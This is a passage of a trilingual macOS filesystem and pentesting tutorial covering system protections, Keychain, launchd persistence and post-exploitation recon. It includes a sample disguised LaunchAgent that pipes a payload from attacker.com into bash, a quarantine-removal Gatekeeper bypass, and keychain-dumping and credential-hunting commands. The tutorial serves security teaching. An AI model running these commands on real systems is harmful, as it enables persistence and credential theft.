Linuxと同様に、`/bin`と`/sbin`には最も必須のUnixバイナリが含まれています。ただし、macOS Catalina以降、この場所は**読み取り専用のシステムボリューム**にあり、いくつかのクラシックなBSDツール（`netstat`、`ifconfig`など）はAppleの現代的なツール（`lsof -i`、`networksetup`、`scutil`）に置き換えられつつあります。

```bash
$ ls /bin
bash    cat    chmod   cp     csh    date
echo    kill   ln      ls     mkdir  mv
ps      pwd    rm      sh     zsh    ...

$ ls /sbin
fsck    ifconfig   mount    ping    reboot
route   shutdown   ...

# macOS-specific networking tools (preferred over legacy ones)
$ networksetup -listallhardwareports
$ scutil --dns                       # DNS configuration
$ scutil --nwi                       # network interface info
$ lsof -i -P                         # listening ports & connections (netstat replacement)
$ system_profiler SPNetworkDataType  # full network hardware report
```

| Binary | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|--------|-----------|-------------|---------|
| `dscl` | Kelola Directory Service | Manage Directory Service | ディレクトリサービス管理 |
| `scutil` | Konfigurasi sistem & jaringan | System & network config | システム/ネットワーク設定 |
| `csrutil` | Kontrol SIP | Control SIP | SIP制御 |
| `codesign` | Verifikasi tanda tangan kode | Verify code signatures | コード署名検証 |
| `spctl` | Kontrol Gatekeeper | Control Gatekeeper | Gatekeeper制御 |
| `security` | Akses Keychain | Access Keychain | キーチェーンアクセス |

---

## 12. 📚 `/usr` — Unix Shared Resources

### 🇮🇩 Bahasa Indonesia
`/usr` berisi mayoritas tool command-line Unix tambahan. Catatan penting: **`/usr/bin` dan `/usr/sbin` sekarang read-only (SIP-protected)** di macOS modern — kamu **tidak bisa lagi** menambah binary langsung ke `/usr/bin` seperti dulu. Untuk itu, gunakan **Homebrew** yang menginstal ke `/usr/local` (Intel Mac) atau `/opt/homebrew` (Apple Silicon).

### 🇬🇧 English
`/usr` contains the majority of additional Unix command-line tools. Important note: **`/usr/bin` and `/usr/sbin` are now read-only (SIP-protected)** on modern macOS — you can **no longer** add binaries directly to `/usr/bin` like in the past. Instead, use **Homebrew**, which installs to `/usr/local` (Intel Mac) or `/opt/homebrew` (Apple Silicon).

### 🇯🇵 日本語
`/usr` には追加のUnixコマンドラインツールの大部分が含まれています。重要な注意点：現代のmacOSでは**`/usr/bin`と`/usr/sbin`は読み取り専用（SIP保護）**になっています — 以前のように`/usr/bin`に直接バイナリを追加することは**できなくなりました**。代わりに、`/usr/local`（Intel Mac）または`/opt/homebrew`（Apple Silicon）にインストールする**Homebrew**を使用してください。

```bash
$ ls /usr
bin  lib  libexec  local  sbin  share  std

# /usr/bin is SIP-protected
$ touch /usr/bin/test
touch: /usr/bin/test: Operation not permitted

# Homebrew locations (package manager — not pre-installed!)
$ which brew
/opt/homebrew/bin/brew              # Apple Silicon (M1/M2/M3/M4)
/usr/local/bin/brew                 # Intel Mac

$ brew list                          # installed packages
$ brew install nmap                  # install a tool

# Check architecture
$ uname -m
arm64        # Apple Silicon
x86_64       # Intel
```

| Directory | 🇮🇩 Catatan | 🇬🇧 Notes | 🇯🇵 メモ |
|-----------|-----------|-----------|---------|
| `/usr/bin` | SIP-protected, read-only | SIP-protected, read-only | SIP保護、読み取り専用 |
| `/usr/local` | Homebrew (Intel) | Homebrew (Intel) | Homebrew（Intel） |
| `/opt/homebrew` | Homebrew (Apple Silicon) | Homebrew (Apple Silicon) | Homebrew（Apple Silicon） |

---

## 13. 📦 `.app` Bundles — Application Package Structure

### 🇮🇩 Bahasa Indonesia
Setiap aplikasi macOS sebenarnya adalah **folder** dengan ekstensi `.app`, terlihat seperti file tunggal di Finder tapi berisi struktur internal lengkap. Memahami struktur ini krusial untuk **analisis malware macOS** dan reverse engineering.

### 🇬🇧 English
Every macOS application is actually a **folder** with a `.app` extension, appearing as a single file in Finder but containing a complete internal structure. Understanding this structure is crucial for **macOS malware analysis** and reverse engineering.

### 🇯🇵 日本語
すべてのmacOSアプリケーションは実際には`.app`拡張子を持つ**フォルダ**であり、Finderでは単一のファイルのように見えますが、完全な内部構造を含んでいます。この構造を理解することは**macOSマルウェア分析**とリバースエンジニアリングにとって重要です。

```
SomeApp.app/
└── Contents/
    ├── Info.plist              ← App metadata (bundle ID, version, permissions)
    ├── MacOS/
    │   └── SomeApp              ← The actual executable binary
    ├── Resources/                ← Icons, images, localized strings
    │   └── AppIcon.icns
    ├── Frameworks/                ← Bundled frameworks/libraries
    ├── PlugIns/                    ← App extensions/plugins
    ├── _CodeSignature/              ← Code signing data
    │   └── CodeResources
    └── embedded.provisionprofile   ← Provisioning profile (if signed)
```

```bash
# Inspect an app bundle's contents
$ ls -la /Applications/Safari.app/Contents/

# View Info.plist (metadata: bundle ID, version, permissions requested)
$ plutil -p /Applications/Safari.app/Contents/Info.plist
$ defaults read /Applications/Safari.app/Contents/Info.plist

# Find the actual executable
$ file /Applications/Safari.app/Contents/MacOS/Safari

# Check code signature & entitlements (security analysis)
$ codesign -dv --verbose=4 /Applications/Safari.app
$ codesign -d --entitlements - /Applications/Safari.app

# Verify Gatekeeper assessment
$ spctl -a -vvv /Applications/Safari.app

# Check for unsigned / ad-hoc signed apps (suspicious!)
$ find /Applications -maxdepth 1 -name "*.app" -exec sh -c \
    'codesign -dv "{}" 2>&1 | grep -q "not signed" && echo "{}"' \;

# Extract & analyze a binary inside a bundle
$ otool -L /Applications/Safari.app/Contents/MacOS/Safari    # linked libraries
$ otool -h /Applications/Safari.app/Contents/MacOS/Safari    # mach-o header

# Check architecture (universal binary support)
$ lipo -info /Applications/Safari.app/Contents/MacOS/Safari
```

| Path inside `.app` | 🇮🇩 Isi | 🇬🇧 Contents | 🇯🇵 内容 | Pentest Value |
|---------------------|--------|-------------|---------|--------------|
| `Contents/MacOS/` | Binary eksekusi utama | Main executable binary | メイン実行ファイル | 🔴 Critical |
| `Contents/Info.plist` | Metadata & permission | Metadata & permissions | メタデータと権限 | 🟠 High |
| `Contents/_CodeSignature/` | Data tanda tangan kode | Code signing data | コード署名データ | 🟠 High |
| `Contents/Resources/` | Asset (icon, gambar) | Assets (icons, images) | アセット（アイコン、画像） | 🟢 Low |
| `Contents/Frameworks/` | Library tertanam | Embedded libraries | 埋め込みライブラリ | 🟡 Medium |

---

## 14. 🛡️ SIP & Gatekeeper — macOS System Protections

### 🇮🇩 Bahasa Indonesia
macOS memiliki beberapa **lapisan proteksi unik** yang tidak ada di Linux/Windows klasik, dan sangat memengaruhi cara pentest dilakukan:

- **SIP (System Integrity Protection)** — mencegah modifikasi `/System`, `/bin`, `/sbin`, `/usr` bahkan oleh root
- **Gatekeeper** — memverifikasi tanda tangan & notarization sebelum app pertama kali dijalankan
- **TCC (Transparency, Consent, and Control)** — meminta izin user untuk akses kamera, mikrofon, file pribadi, dll.
- **Notarization** — Apple memindai malware pada app sebelum mengizinkan distribusi di luar App Store

### 🇬🇧 English
macOS has several **unique protection layers** not found in classic Linux/Windows, and they heavily affect how pentesting is done:

- **SIP (System Integrity Protection)** — prevents modification of `/System`, `/bin`, `/sbin`, `/usr` even by root
- **Gatekeeper** — verifies signature & notarization before an app runs for the first time
- **TCC (Transparency, Consent, and Control)** — requests user permission for camera, microphone, personal files, etc.
- **Notarization** — Apple scans apps for malware before allowing distribution outside the App Store

### 🇯🇵 日本語
macOSにはクラシックなLinux/Windowsには見られない**独自の保護層**がいくつかあり、ペンテストの方法に大きく影響します：

- **SIP（システム整合性保護）** — rootであっても`/System`、`/bin`、`/sbin`、`/usr`の変更を防止
- **Gatekeeper** — アプリの初回実行前に署名とノータライゼーションを検証
- **TCC（透明性・同意・制御）** — カメラ、マイク、個人ファイルなどへのアクセスにユーザーの許可を要求
- **ノータライゼーション** — App Store以外での配布を許可する前にAppleがアプリのマルウェアをスキャン

```bash
# ── SIP ────────────────────────────────────────────────────────────
$ csrutil status
System Integrity Protection status: enabled.

# Disabling SIP requires Recovery Mode (not possible from normal boot):
# 1. Reboot, hold Cmd+R to enter Recovery
# 2. Open Terminal from Utilities menu
# 3. csrutil disable
# 4. Reboot

# ── GATEKEEPER ─────────────────────────────────────────────────────
$ spctl --status
assessments enabled

$ spctl -a -vvv /Applications/SomeApp.app    # check if app would be allowed to run

# Remove quarantine attribute (common bypass technique — known to attackers!)
$ xattr -d com.apple.quarantine /path/to/file.app
$ xattr -l /path/to/file.app                  # list all extended attributes

# ── TCC (PRIVACY PERMISSIONS) ────────────────────────────────────────
# TCC database (per-user) — tracks which apps have which permissions
$ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value,service FROM access;"

# System-wide TCC database (requires Full Disk Access to read)
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value,service FROM access;"

# Reset TCC permissions for an app
$ tccutil reset All com.somecompany.someapp

# ── NOTARIZATION CHECK ─────────────────────────────────────────────
$ spctl -a -t exec -vv /Applications/SomeApp.app
$ codesign --test-requirement="=notarized" --verify --verbose /Applications/SomeApp.app

# ── FULL DISK ACCESS (relevant for security tools & malware) ───────
# Check which apps have Full Disk Access (System Settings > Privacy)
# Programmatically:
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles';"
```

### 📊 macOS Protection Layers Summary

| Protection | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 | Bypass Relevance |
|------------|-----------|-------------|---------|------------------|
| SIP | Lindungi file sistem inti | Protect core system files | コアシステムファイル保護 | 🔴 Requires Recovery Mode |
| Gatekeeper | Verifikasi tanda tangan app | Verify app signatures | アプリ署名検証 | 🟠 `xattr -d` quarantine removal |
| TCC | Izin privasi (kamera, file) | Privacy permissions (camera, files) | プライバシー権限 | 🟠 Social engineering / TCC.db abuse |
| Notarization | Scan malware Apple | Apple malware scanning | Appleマルウェアスキャン | 🟡 Ad-hoc signing evasion |

---

## 15. 🔑 Keychain — Credential Storage

### 🇮🇩 Bahasa Indonesia
**Keychain** adalah sistem penyimpanan kredensial terenkripsi bawaan macOS — menyimpan password Wi-Fi, password aplikasi, sertifikat, dan kunci private. Ini setara dengan **Credential Manager** di Windows, dan merupakan **target nomor satu** dalam post-exploitation macOS.

### 🇬🇧 English
**Keychain** is macOS's built-in encrypted credential storage system — storing Wi-Fi passwords, app passwords, certificates, and private keys. It's the equivalent of Windows' **Credential Manager**, and is the **#1 target** in macOS post-exploitation.

### 🇯🇵 日本語
**キーチェーン**はmacOSの組み込み暗号化認証情報ストレージシステムです — Wi-Fiパスワード、アプリパスワード、証明書、秘密鍵を保存します。これはWindowsの**Credential Manager**に相当し、macOSのポストエクスプロイテーションにおける**最優先ターゲット**です。

```bash
# List all keychains
$ security list-keychains

# Default keychain location
$ ls -la ~/Library/Keychains/
login.keychain-db

# Dump keychain info (won't show passwords without unlock)
$ security dump-keychain ~/Library/Keychains/login.keychain-db

# Find a specific password (prompts for keychain unlock / Touch ID)
$ security find-generic-password -s "ServiceName" -g

# Find Wi-Fi password (common pentest demo)
$ security find-generic-password -D "AirPort network password" -a "WiFiName" -w

# Find internet passwords (websites)
$ security find-internet-password -s "github.com" -g

# Export all certificates
$ security find-certificate -a -p ~/Library/Keychains/login.keychain-db

# Unlock keychain (requires password)
$ security unlock-keychain ~/Library/Keychains/login.keychain-db

# Keychain access via GUI (for comparison)
$ open -a "Keychain Access"

# System keychain (used by system services, root-readable)
$ ls -la /Library/Keychains/
$ sudo security dump-keychain /Library/Keychains/System.keychain
```

> 🔴 **Pentesting note:** Keychain dilindungi password login user (atau Touch ID). Tanpa password tersebut, dump keychain hanya menunjukkan metadata, bukan secret aktual. Teknik seperti **keychain dumping via memory** (Mimikatz-style untuk macOS, contoh: `Chainbreaker`) diperlukan jika hanya punya akses non-interaktif.

| Keychain | Location | 🇮🇩 Isi | 🇬🇧 Contents | 🇯🇵 内容 |
|----------|----------|--------|-------------|---------|
| Login Keychain | `~/Library/Keychains/login.keychain-db` | Password user, Wi-Fi, app | User passwords, Wi-Fi, app | ユーザーパスワード、Wi-Fi、アプリ |
| System Keychain | `/Library/Keychains/System.keychain` | Kredensial level-sistem | System-level credentials | システムレベル認証情報 |
| iCloud Keychain | Synced via iCloud | Password tersinkron iCloud | iCloud-synced passwords | iCloud同期パスワード |

---

## 16. 🚀 LaunchAgents & LaunchDaemons — Persistence & Startup

### 🇮🇩 Bahasa Indonesia
macOS **tidak menggunakan cron sebagai mekanisme utama** untuk tugas terjadwal/startup modern — itu digantikan oleh **launchd**, dikonfigurasi via file `.plist` di beberapa lokasi. Ini adalah **vektor persistence #1** di macOS, baik untuk software legit maupun malware.

Perbedaan kunci:
- **LaunchAgents** — berjalan sebagai user yang login (punya akses GUI)
- **LaunchDaemons** — berjalan sebagai root, tanpa sesi user (background service)

### 🇬🇧 English
macOS **does not use cron as the primary mechanism** for modern scheduled tasks/startup — that's replaced by **launchd**, configured via `.plist` files in several locations. This is the **#1 persistence vector** on macOS, for both legitimate software and malware.

Key difference:
- **LaunchAgents** — run as the logged-in user (have GUI access)
- **LaunchDaemons** — run as root, without a user session (background service)

### 🇯🇵 日本語
macOSは現代のスケジュールタスク/起動の主要なメカニズムとして**cronを使用しません** — それは複数の場所にある`.plist`ファイルで設定される**launchd**に置き換えられています。これは正当なソフトウェアとマルウェアの両方にとって、macOSにおける**永続化ベクター第1位**です。

主な違い：
- **LaunchAgents** — ログインユーザーとして実行（GUIアクセスあり）
- **LaunchDaemons** — rootとして実行、ユーザーセッションなし（バックグラウンドサービス）

```bash
# ── FOUR PERSISTENCE LOCATIONS (in order of privilege) ──────────────
~/Library/LaunchAgents/                  # per-user, no admin needed
/Library/LaunchAgents/                   # all-users, needs admin to write
/Library/LaunchDaemons/                  # root-level daemon, needs admin
/System/Library/LaunchDaemons/           # Apple's own (SIP-protected)

# List all LaunchAgents/Daemons across the system
$ ls ~/Library/LaunchAgents/
$ ls /Library/LaunchAgents/
$ ls /Library/LaunchDaemons/

# View a launchd plist
$ cat ~/Library/LaunchAgents/com.example.agent.plist
$ plutil -p ~/Library/LaunchAgents/com.example.agent.plist

# List all currently loaded launchd jobs
$ launchctl list
$ launchctl list | grep -v com.apple    # filter out Apple's own (focus on 3rd-party)

# Load / unload a launch agent manually
$ launchctl load ~/Library/LaunchAgents/com.example.agent.plist
$ launchctl unload ~/Library/LaunchAgents/com.example.agent.plist

# Example malicious-style persistence plist structure:
cat << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update.helper</string>     <!-- disguised name -->
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://attacker.com/payload | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
EOF

# ── LOGIN ITEMS (GUI-visible startup apps) ──────────────────────────
$ osascript -e 'tell application "System Events" to get the name of every login item'

# ── LEGACY CRON (still works, but rarely used by modern macOS) ─────
$ crontab -l
$ sudo crontab -l -u root

# ── PERIODIC SCRIPTS (built-in maintenance, rarely abused but exists) ─
$ ls /etc/periodic/daily/
$ ls /etc/periodic/weekly/
$ ls /etc/periodic/monthly/

# ── AUDIT FOR SUSPICIOUS PERSISTENCE (quick triage) ──────────────────
$ for dir in ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons; do
    echo "=== $dir ==="
    ls -la "$dir" 2>/dev/null
done
```

### 📊 Persistence Location Priority Table

| Location | Runs As | 🇮🇩 Catatan | 🇬🇧 Notes | Pentest Value |
|----------|---------|-----------|---------|--------------|
| `~/Library/LaunchAgents/` | Current user | Tidak perlu admin | No admin needed | 🔴 Critical |
| `/Library/LaunchAgents/` | Any logged-in user | Perlu akses admin untuk tulis | Needs admin to write | 🔴 Critical |
| `/Library/LaunchDaemons/` | root | Perlu akses admin, jalan tanpa login | Needs admin, runs without login | 🔴 Critical |
| `/System/Library/LaunchDaemons/` | root | SIP-protected (Apple only) | SIP-protected (Apple only) | 🟢 Low (defended) |
| Login Items | Current user | Terlihat di System Settings | Visible in System Settings | 🟠 High |

---

## 17. 💿 Volumes & APFS — Modern Volume Structure

### 🇮🇩 Bahasa Indonesia
`/Volumes` berisi semua **drive eksternal, network share, dan disk image yang ter-mount**, mirip dengan `/mnt` & `/media` di Linux. Boot drive (`Macintosh HD`) juga muncul di sini sebagai referensi diri.

### 🇬🇧 English
`/Volumes` contains all **mounted external drives, network shares, and disk images**, similar to `/mnt` & `/media` on Linux. The boot drive (`Macintosh HD`) also appears here as a self-reference.

### 🇯🇵 日本語
`/Volumes` には、Linuxの`/mnt`と`/media`に似た、すべての**マウントされた外部ドライブ、ネットワーク共有、ディスクイメージ**が含まれています。ブートドライブ（`Macintosh HD`）もここに自己参照として表示されます。

```bash
# List mounted volumes
$ ls /Volumes/
$ diskutil list

# Mount a disk image (.dmg)
$ hdiutil attach SomeApp.dmg

# Unmount a volume
$ diskutil unmount /Volumes/USB_DRIVE
$ diskutil eject /Volumes/USB_DRIVE

# Check disk usage
$ df -h

# View APFS container details
$ diskutil apfs list

# Create an APFS snapshot (used by Time Machine)
$ tmutil snapshot

# List Time Machine snapshots
$ tmutil listlocalsnapshots /

# Check FileVault encryption status
$ fdesetup status
FileVault is On.

# Mount a remote SMB/AFP share
$ mount_smbfs //user@server/share /Volumes/share
```

| Path | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 |
|------|-----------|-------------|---------|
| `/Volumes/` | Drive eksternal & network share | External drives & network shares | 外部ドライブとネットワーク共有 |
| `diskutil` | Manajemen disk & partisi | Disk & partition management | ディスク・パーティション管理 |
| `tmutil` | Time Machine & snapshot | Time Machine & snapshots | Time Machineとスナップショット |
| `fdesetup` | Kontrol FileVault | FileVault control | FileVault制御 |

---

## 18. 🔐 Security Note — Key Locations for Pentesting

### 🇮🇩 Bahasa Indonesia
Berikut adalah lokasi-lokasi **paling penting dari perspektif macOS pentesting**, baik untuk rekognisi, privilege escalation, credential dumping, maupun forensik:

### 🇬🇧 English
Here are the **most important locations from a macOS pentesting perspective**, whether for reconnaissance, privilege escalation, credential dumping, or forensics:

### 🇯🇵 日本語
偵察、権限昇格、認証情報ダンプ、フォレンジクスのいずれの観点からも、**macOSペンテストの観点から最も重要な場所**を以下に示します：

```bash
# ── CREDENTIAL HUNTING ───────────────────────────────────────────
~/Library/Keychains/login.keychain-db          # user passwords, Wi-Fi, certs
/Library/Keychains/System.keychain             # system-level credentials
~/Library/Application\ Support/com.apple.TCC/TCC.db   # privacy permissions DB
~/.ssh/id_rsa, ~/.ssh/id_ed25519                # SSH private keys
~/.zsh_history, ~/.bash_history                  # command history

# Browser saved passwords (Chrome — separate from Safari/Keychain)
~/Library/Application\ Support/Google/Chrome/Default/Login\ Data

# 1Password / other password manager local vaults
~/Library/Containers/com.1password.1password/

# ── PRIVILEGE ESCALATION ────────────────────────────────────────────
# Check sudo rights
$ sudo -l

# Check SUID binaries
$ find / -perm -4000 -type f 2>/dev/null

# Check writable LaunchDaemons (root persistence if writable!)
$ find /Library/LaunchDaemons -writable 2>/dev/null

# Check for outdated/vulnerable software via system_profiler
$ system_profiler SPApplicationsDataType | grep -A 3 "Version"

# Check admin group members
$ dscl . -read /Groups/admin GroupMembership

# Check if current user can escalate via sudoers misconfig
$ sudo cat /etc/sudoers
$ sudo cat /etc/sudoers.d/*

# ── PERSISTENCE LOCATIONS ────────────────────────────────────────────
~/Library/LaunchAgents/                     # user-level persistence
/Library/LaunchAgents/                      # system-level (all users)
/Library/LaunchDaemons/                     # root-level daemon persistence
~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/  # background task DB

# Login items
$ osascript -e 'tell application "System Events" to get the name of every login item'

# ── LOG ANALYSIS (forensics) ──────────────────────────────────────────
$ log show --predicate 'eventMessage contains "authentication"' --last 1d
$ log show --predicate 'process == "sudo"' --last 1d
/var/log/install.log                        # software install history
~/Library/Logs/DiagnosticReports/           # crash reports

# ── FORENSIC ARTIFACTS ──────────────────────────────────────────────
/.fseventsd/                                # filesystem event history
~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2  # downloaded file history
.DS_Store                                    # per-folder Finder metadata, reveals file listings
~/Library/Safari/History.db                  # browsing history
~/Library/Messages/chat.db                    # iMessage history
~/Library/Application\ Support/com.apple.sharedfilelist/  # recent files
```

### 📊 macOS Security Priority Table

| Location | 🔴 Risk Level | 🇮🇩 Alasan | 🇬🇧 Reason | 🇯🇵 理由 |
|----------|--------------|-----------|-----------|---------|
| `login.keychain-db` | 🔴 Critical | Password & cert tersimpan | Stored passwords & certs | 保存されたパスワードと証明書 |
| `TCC.db` | 🔴 Critical | Database izin privasi | Privacy permissions database | プライバシー権限DB |
| `~/.ssh/id_rsa` | 🔴 High | SSH private key | SSH private key | SSH秘密鍵 |
| `LaunchAgents/Daemons` | 🔴 Critical | Vektor persistence utama | Primary persistence vector | 主要な永続化ベクター |
| `.zsh_history` | 🔴 High | Riwayat perintah + password | Command history + passwords | コマンド履歴+パスワード |
| `chat.db` / `History.db` | 🟠 High | Data pribadi sensitif | Sensitive personal data | 機密個人データ |
| `/etc/sudoers` | 🔴 Critical | Konfigurasi izin root | Root permission config | root権限設定 |
| `.DS_Store` | 🟡 Medium | Bocoran struktur folder | Folder structure leak | フォルダ構造の漏洩 |
| `DiagnosticReports/` | 🟡 Medium | Detail crash & memori | Crash & memory details | クラッシュとメモリの詳細 |

---

## 📊 Complete Directory Reference Table

| Directory | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 | Linux Equivalent |
|-----------|-----------|-------------|---------|-------------------|
| `/` | Direktori akar (firmlink view) | Root directory (firmlink view) | ルート（ファームリンクビュー） | `/` |
| `/Applications` | Aplikasi terinstal | Installed applications | インストール済みアプリ | `/usr/share/applications` (loosely) |
| `/System` | Inti OS, SIP-protected | Core OS, SIP-protected | コアOS、SIP保護 | `/usr`, `/lib` (combined) |
| `/Library` | Data app level-sistem | System-level app data | システムレベルアプリデータ | `/etc`, `/var/lib` (loosely) |
| `~/Library` | Data app per-user | Per-user app data | ユーザーごとのアプリデータ | `~/.config`, `~/.local/share` |
| `/Users` | Home direktori user | User home directories | ユーザーホーム | `/home` |
| `/private/etc` | Konfigurasi Unix | Unix configuration | Unix設定 | `/etc` |
| `/private/var` | Data variabel & log | Variable data & logs | 可変データとログ | `/var` |
| `/private/tmp` | File sementara | Temporary files | 一時ファイル | `/tmp` |
| `/bin`, `/sbin` | Binary Unix esensial | Essential Unix binaries | 必須Unixバイナリ | `/bin`, `/sbin` |
| `/usr` | Resource Unix bersama | Unix shared resources | Unix共有リソース | `/usr` |
| `/opt/homebrew` | Package manager (Apple Silicon) | Package manager (Apple Silicon) | パッケージマネージャー | `/usr/local` |
| `/Volumes` | Drive eksternal & mount | External drives & mounts | 外部ドライブとマウント | `/mnt`, `/media` |

---

## 🔗 Practical Workflow Example

```bash
# ── SCENARIO: macOS post-exploitation filesystem recon ──────────────

# 1. Who am I and what privileges do I have?
$ whoami
$ id
$ groups
$ dscl . -read /Groups/admin GroupMembership

# 2. System information
$ sw_vers                              # macOS version
$ uname -a
$ system_profiler SPHardwareDataType   # hardware details
$ sysctl -n machdep.cpu.brand_string   # CPU info

# 3. List all local users
$ dscl . list /Users | grep -v "^_"
$ dscl . -read /Users/alice

# 4. Check SIP and Gatekeeper status
$ csrutil status
$ spctl --status

# 5. Hunt for credentials in Keychain
$ security dump-keychain ~/Library/Keychains/login.keychain-db
$ security find-generic-password -ga "wifi-network-name"

# 6. Check shell history across all users
$ for user in $(dscl . list /Users | grep -v "^_"); do
    echo "=== $user ==="
    sudo cat "/Users/$user/.zsh_history" 2>/dev/null
done

# 7. Find SSH keys
$ find /Users -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# 8. Check persistence locations
$ ls -la ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/
$ launchctl list | grep -v com.apple

# 9. Check login items
$ osascript -e 'tell application "System Events" to get the name of every login item'

# 10. Check sudo privileges
$ sudo -l

# 11. Find writable system locations (privesc)
$ find / -writable -type d 2>/dev/null | grep -v -E "^/(dev|proc|private/var/folders)"

# 12. Check installed applications for known vulnerable versions
$ system_profiler SPApplicationsDataType > installed_apps.txt

# 13. Search for credentials in config files
$ grep -r "password" ~/Library/Application\ Support/ 2>/dev/null | head -20

# 14. Check recent security-related unified log events
$ log show --predicate 'eventMessage contains "authentication" OR eventMessage contains "sudo"' --last 1d

# 15. Check TCC database for privacy permission grants (Full Disk Access apps etc.)
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client, service FROM access WHERE auth_value=2;"
```

---

## 🧠 Quick Reference Cheatsheet

```bash
# ── NAVIGATION ───────────────────────────────────────────────────
cd /                                # go to root
ls -la ~/Library                    # hidden per-user library
chflags nohidden ~/Library          # unhide Library in Finder
open .                              # open current dir in Finder
open -a "Terminal" .                # open in new Terminal window

# ── SYSTEM INFO ──────────────────────────────────────────────────
sw_vers                             # macOS version
uname -a                            # kernel info
system_profiler SPHardwareDataType  # hardware details
sysctl -n hw.model                  # Mac model identifier
uname -m                            # arm64 (Apple Silicon) or x86_64 (Intel)

# ── USER & GROUPS ────────────────────────────────────────────────
dscl . list /Users                  # all user accounts
dscl . -read /Users/<user>          # user details
dscl . -read /Groups/admin GroupMembership   # admin members
id; whoami; groups

# ── KEYCHAIN ─────────────────────────────────────────────────────
security list-keychains
security find-generic-password -ga "ServiceName"
security dump-keychain ~/Library/Keychains/login.keychain-db

# ── SECURITY PROTECTIONS ─────────────────────────────────────────
csrutil status                      # SIP status
spctl --status                      # Gatekeeper status
xattr -d com.apple.quarantine file  # remove quarantine flag
codesign -dv --verbose=4 app.app    # check code signature

# ── PERSISTENCE LOCATIONS ────────────────────────────────────────
~/Library/LaunchAgents/
/Library/LaunchAgents/
/Library/LaunchDaemons/
launchctl list | grep -v com.apple

# ── LOGS (UNIFIED LOGGING) ───────────────────────────────────────
log show --last 1h
log stream --predicate 'process == "sshd"'
log show --predicate 'eventMessage contains "password"' --last 1d

# ── NETWORK INFO ──────────────────────────────────────────────────
lsof -i -P                          # listening ports (netstat replacement)
networksetup -listallhardwareports
scutil --dns

# ── FIND COMMANDS ────────────────────────────────────────────────
find / -name "*.plist" 2>/dev/null              # find plist configs
find / -perm -4000 2>/dev/null                  # find SUID files
find / -writable -type d 2>/dev/null            # find writable dirs
find /Users -name "id_rsa" 2>/dev/null          # find SSH keys
find / -name "*.app" -maxdepth 4 2>/dev/null    # find installed apps

# ── DISK & VOLUMES ───────────────────────────────────────────────
diskutil list                       # list disks/volumes
df -h                                # disk usage
fdesetup status                      # FileVault encryption status
tmutil listlocalsnapshots /          # Time Machine snapshots

# ── APP BUNDLE ANALYSIS ──────────────────────────────────────────
plutil -p App.app/Contents/Info.plist     # read plist as JSON-like
otool -L App.app/Contents/MacOS/App        # linked libraries
lipo -info App.app/Contents/MacOS/App      # architecture info
codesign -d --entitlements - App.app       # entitlements
```

---

> 📚 **References:**
> - [Apple Developer — File System Programming Guide](https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/)
> - [Apple Platform Security Guide](https://support.apple.com/guide/security/welcome/web)
> - [HackTheBox Academy — macOS Fundamentals](https://academy.hackthebox.com)
> - [Objective-See — macOS Malware Analysis Resources](https://objective-see.org)
> - [PayloadsAllTheThings — macOS Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings)
> - [`man hier`](command:man hier) — Manual page for the macOS filesystem hierarchy

> 🔖 **Repository:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)  
> 💬 **Feedback & Contributions welcome!** Open an issue or PR if you spot any errors.